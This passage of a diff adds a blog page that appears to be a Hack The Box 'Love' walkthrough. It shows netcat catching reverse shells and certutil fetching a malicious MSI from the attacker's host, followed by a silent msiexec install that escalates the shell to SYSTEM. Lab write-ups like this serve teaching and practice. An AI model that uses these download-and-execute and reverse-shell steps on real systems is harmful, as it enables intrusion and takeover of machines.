+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali@kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~/htb/love/blog<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo nc -nvlp <span style="color:#a5d6ff">4445</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>sudo<span style="color:#ff7b72;font-weight:bold">]</span> password <span style="color:#ff7b72">for</span> kali: 
+</span></span><span style="display:flex;"><span>listening on <span style="color:#ff7b72;font-weight:bold">[</span>any<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#a5d6ff">4445</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#ff7b72;font-weight:bold">[</span>10.10.14.6<span style="color:#ff7b72;font-weight:bold">]</span> from <span style="color:#ff7b72;font-weight:bold">(</span>UNKNOWN<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#ff7b72;font-weight:bold">[</span>10.10.10.239<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#a5d6ff">50992</span>
+</span></span><span style="display:flex;"><span>Microsoft Windows <span style="color:#ff7b72;font-weight:bold">[</span>Version 10.0.19042.867<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">(</span>c<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#a5d6ff">2020</span> Microsoft Corporation. All rights reserved.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:<span style="color:#79c0ff">\x</span>ampp<span style="color:#79c0ff">\h</span>tdocs<span style="color:#79c0ff">\o</span>mrs<span style="color:#79c0ff">\i</span>mages&gt;whoami
+</span></span><span style="display:flex;"><span>whoami   
+</span></span><span style="display:flex;"><span>love<span style="color:#79c0ff">\p</span>hoebe    
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:<span style="color:#79c0ff">\x</span>ampp<span style="color:#79c0ff">\h</span>tdocs<span style="color:#79c0ff">\o</span>mrs<span style="color:#79c0ff">\i</span>mages&gt;certutil.exe -urlcache -f http://10.10.14.6/system.msi system.msi
+</span></span><span style="display:flex;"><span>certutil.exe -urlcache -f http://10.10.14.6/system.msi system.msi
+</span></span><span style="display:flex;"><span>****  Online  ****
+</span></span><span style="display:flex;"><span>CertUtil: -URLCache command completed successfully.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:<span style="color:#79c0ff">\x</span>ampp<span style="color:#79c0ff">\h</span>tdocs<span style="color:#79c0ff">\o</span>mrs<span style="color:#79c0ff">\i</span>mages&gt;dir
+</span></span><span style="display:flex;"><span>dir
+</span></span><span style="display:flex;"><span>    Volume in drive C has no label.
+</span></span><span style="display:flex;"><span>    Volume Serial Number is 56DE-BA30
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Directory of C:<span style="color:#79c0ff">\x</span>ampp<span style="color:#79c0ff">\h</span>tdocs<span style="color:#79c0ff">\o</span>mrs<span style="color:#79c0ff">\i</span>mages
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>08/07/2021  12:26 PM    &lt;DIR&gt;          .
+</span></span><span style="display:flex;"><span>08/07/2021  12:26 PM    &lt;DIR&gt;          ..
+</span></span><span style="display:flex;"><span>08/06/2021  07:48 PM           159,744 admin.msi
+</span></span><span style="display:flex;"><span>05/18/2018  08:10 AM             4,240 facebook-profile-image.jpeg
+</span></span><span style="display:flex;"><span>04/12/2021  03:53 PM                 <span style="color:#a5d6ff">0</span> index.html.txt
+</span></span><span style="display:flex;"><span>01/27/2021  12:08 AM               <span style="color:#a5d6ff">844</span> index.jpeg
+</span></span><span style="display:flex;"><span>08/06/2021  07:33 PM         1,919,488 privilege.exe
+</span></span><span style="display:flex;"><span>08/24/2017  04:00 AM            26,644 profile.jpg
+</span></span><span style="display:flex;"><span>08/06/2021  07:06 PM             7,168 reverse1.exe
+</span></span><span style="display:flex;"><span>08/07/2021  12:14 PM             7,168 shell.exe
+</span></span><span style="display:flex;"><span>08/07/2021  12:26 PM           159,744 system.msi
+</span></span><span style="display:flex;"><span>                <span style="color:#a5d6ff">9</span> File<span style="color:#ff7b72;font-weight:bold">(</span>s<span style="color:#ff7b72;font-weight:bold">)</span>      2,285,040 bytes
+</span></span><span style="display:flex;"><span>                <span style="color:#a5d6ff">2</span> Dir<span style="color:#ff7b72;font-weight:bold">(</span>s<span style="color:#ff7b72;font-weight:bold">)</span>   3,879,710,720 bytes free
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:<span style="color:#79c0ff">\x</span>ampp<span style="color:#79c0ff">\h</span>tdocs<span style="color:#79c0ff">\o</span>mrs<span style="color:#79c0ff">\i</span>mages&gt;msiexec /quiet /qn /i system.msi
+</span></span><span style="display:flex;"><span>msiexec /quiet /qn /i system.msi
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:<span style="color:#79c0ff">\x</span>ampp<span style="color:#79c0ff">\h</span>tdocs<span style="color:#79c0ff">\o</span>mrs<span style="color:#79c0ff">\i</span>mages&gt;
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali@kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~/htb/love/blog<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo nc -nvlp <span style="color:#a5d6ff">4446</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>sudo<span style="color:#ff7b72;font-weight:bold">]</span> password <span style="color:#ff7b72">for</span> kali: 
+</span></span><span style="display:flex;"><span>listening on <span style="color:#ff7b72;font-weight:bold">[</span>any<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#a5d6ff">4446</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#ff7b72;font-weight:bold">[</span>10.10.14.6<span style="color:#ff7b72;font-weight:bold">]</span> from <span style="color:#ff7b72;font-weight:bold">(</span>UNKNOWN<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#ff7b72;font-weight:bold">[</span>10.10.10.239<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#a5d6ff">50995</span>
+</span></span><span style="display:flex;"><span>Microsoft Windows <span style="color:#ff7b72;font-weight:bold">[</span>Version 10.0.19042.867<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">(</span>c<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#a5d6ff">2020</span> Microsoft Corporation. All rights reserved.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:<span style="color:#79c0ff">\W</span>INDOWS<span style="color:#79c0ff">\s</span>ystem32&gt;whoami
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>nt authority<span style="color:#79c0ff">\s</span>ystem
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:<span style="color:#79c0ff">\W</span>INDOWS<span style="color:#79c0ff">\s</span>ystem32&gt;
+</span></span></code></pre></div>
+      </div>
+
+
+      <footer>
+        
+
+
+        
+        
+        
+        
+        
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+      2020 -
+    
+    2025
+     matt johnson 
+    ·
+    
+    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+</html>
